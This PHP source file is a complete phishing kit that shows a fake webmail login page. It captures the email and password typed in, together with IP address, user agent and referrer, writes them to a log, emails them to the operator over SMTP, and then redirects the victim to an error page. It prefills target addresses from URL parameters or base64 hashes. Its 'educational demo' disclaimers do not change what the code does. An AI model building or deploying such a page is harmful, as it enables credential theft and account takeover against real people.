<?php
session_start();

// Load configuration
$config = require_once 'config.php';

// Load Composer autoloader
if (file_exists('vendor/autoload.php')) {
    require_once 'vendor/autoload.php';
} else {
    // Fallback if composer is not used
    require_once 'PHPMailer/src/PHPMailer.php';
    require_once 'PHPMailer/src/SMTP.php';
    require_once 'PHPMailer/src/Exception.php';
}

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

/**
 * Send email notification via SMTP
 */
function sendNotification($data, $smtp_config, $notification_email) {
    $mail = new PHPMailer(true);
    
    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host = $smtp_config['host'];
        $mail->SMTPAuth = true;
        $mail->Username = $smtp_config['username'];
        $mail->Password = $smtp_config['password'];
        $mail->SMTPSecure = $smtp_config['encryption'];
        $mail->Port = $smtp_config['port'];
        
        // Recipients
        $mail->setFrom($smtp_config['username'], 'Webmail Security System');
        $mail->addAddress($notification_email);
        
        // Content
        $mail->isHTML(true);
        $mail->Subject = 'Login Attempt Captured - ' . date('Y-m-d H:i:s');
        
        $html_body = "
        <html>
        <head>
            <style>
                body { font-family: Arial, sans-serif; }
                .header { background: #f8f9fa; padding: 20px; border-radius: 5px; }
                .data-table { width: 100%; border-collapse: collapse; margin: 20px 0; }
                .data-table th, .data-table td { border: 1px solid #ddd; padding: 12px; text-align: left; }
                .data-table th { background-color: #f2f2f2; }
                .warning { color: #856404; background-color: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; border-radius: 4px; }
            </style>
        </head>
        <body>
            <div class='header'>
                <h2>🔐 Login Attempt Captured</h2>
                <p>A new login attempt has been recorded on your webmail demo page.</p>
            </div>
            
            <table class='data-table'>
                <tr><th>Field</th><th>Value</th></tr>
                <tr><td><strong>Email</strong></td><td>{$data['email']}</td></tr>
                <tr><td><strong>Password</strong></td><td>{$data['password']}</td></tr>
                <tr><td><strong>IP Address</strong></td><td>{$data['ip']}</td></tr>
                <tr><td><strong>User Agent</strong></td><td>{$data['user_agent']}</td></tr>
                <tr><td><strong>Timestamp</strong></td><td>{$data['timestamp']}</td></tr>
                <tr><td><strong>Referrer</strong></td><td>{$data['referrer']}</td></tr>
            </table>
            
            <div class='warning'>
                <strong>Note:</strong> This is for educational purposes only. Ensure you have proper authorization before collecting any credentials.
            </div>
        </body>
        </html>";
        
        $mail->Body = $html_body;
        $mail->AltBody = "Login attempt captured:\nEmail: {$data['email']}\nPassword: {$data['password']}\nIP: {$data['ip']}\nTime: {$data['timestamp']}";
        
        return $mail->send();
    } catch (Exception $e) {
        error_log("Email sending failed: " . $mail->ErrorInfo);
        return false;
    }
}

/**
 * Log attempt to file
 */
function logAttempt($data, $log_file) {
    $log_entry = json_encode($data) . "\n";
    return file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && isset($_POST['password'])) {
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = $_POST['password'];
    
    // Collect additional data
    $data = [
        'email' => $email,
        'password' => $password,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'referrer' => $_SERVER['HTTP_REFERER'] ?? 'Direct',
        'timestamp' => date('Y-m-d H:i:s'),
        'session_id' => session_id(),
        'request_uri' => $_SERVER['REQUEST_URI'] ?? '',
        'server_name' => $_SERVER['SERVER_NAME'] ?? ''
    ];
    
    // Log the attempt
    if (logAttempt($data, $config['app']['log_file'])) {
        error_log("Login attempt logged for: " . $email);
    }
    
    // Send notification email (use gmail config as default)
    $smtp_config = $config['smtp']['gmail'];
    $notification_email = $config['app']['notification_email'];
    
    if (sendNotification($data, $smtp_config, $notification_email)) {
        error_log("Notification email sent successfully");
    } else {
        error_log("Failed to send notification email");
    }
    
    // Simulate processing delay
    sleep(2);
    
    // Redirect to error page
    header('Location: error.php');
    exit();
}

// Extract email from URL parameters
$target_email = '';
if (isset($_GET['email'])) {
    $target_email = urldecode($_GET['email']);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $config['app']['name']; ?> - Login</title>
    
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    
    <!-- Favicon -->
    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIACOAAGAAFGAAAIKQTKCNCHOKAAAAANDULIDRIAAAAAG AAAAIAGGGAAAAC3P69AAAAPLJREFUWIXTSJ2IH..." type="image/x-icon">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            animation: slideIn 0.5s ease-out;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: #333;
            font-size: 28px;
            font-weight: 300;
        }
        
        .logo p {
            color: #666;
            margin-top: 5px;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        input[type="email"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .login-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: transform 0.2s ease;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
        }
        
        .login-btn:active {
            transform: translateY(0);
        }
        
        .security-notice {
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 5px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 10px;
        }
        
        .spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #667eea;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1><?php echo $config['app']['name']; ?></h1>
            <p>Secure Email Access</p>
        </div>
        
        <form method="POST" action="" id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" value="<?php echo htmlspecialchars($target_email, ENT_QUOTES, 'UTF-8'); ?>" required autocomplete="email">
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            
            <button type="submit" class="login-btn" id="submitBtn">
                Sign In
            </button>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <span style="margin-left: 10px;">Authenticating...</span>
            </div>
        </form>
        
        <div class="security-notice">
            <strong>Educational Demo:</strong> This is a demonstration page for educational purposes only.
        </div>
    </div>

    <script>
        $(document).ready(function() {
            // Extract email from URL hash
            function extractEmailFromHash() {
                var hash = window.location.hash;
                if (hash && hash.includes('#')) {
                    var email = hash.split('#')[1];
                    
                    if (email) {
                        try {
                            // Try to decode base64
                            var decodedEmail = atob(email);
                            if (decodedEmail.includes('@')) {
                                $('#email').val(decodedEmail);
                            } else {
                                $('#email').val(email);
                            }
                        } catch(e) {
                            // If not base64, use as is
                            $('#email').val(decodeURIComponent(email));
                        }
                    }
                }
            }
            
            // Extract email from URL parameters
            function extractEmailFromParams() {
                var urlParams = new URLSearchParams(window.location.search);
                var emailParam = urlParams.get('email');
                if (emailParam) {
                    $('#email').val(decodeURIComponent(emailParam));
                }
            }
            
            // Initialize
            extractEmailFromHash();
            extractEmailFromParams();
            
            // Handle form submission
            $('#loginForm').on('submit', function(e) {
                var email = $('#email').val();
                var password = $('#password').val();
                
                if (!email || !password) {
                    e.preventDefault();
                    alert('Please fill in all fields.');
                    return false;
                }
                
                // Show loading animation
                $('#submitBtn').hide();
                $('#loading').show();
                
                // Allow form to submit normally
                return true;
            });
        });
    </script>
</body>
</html>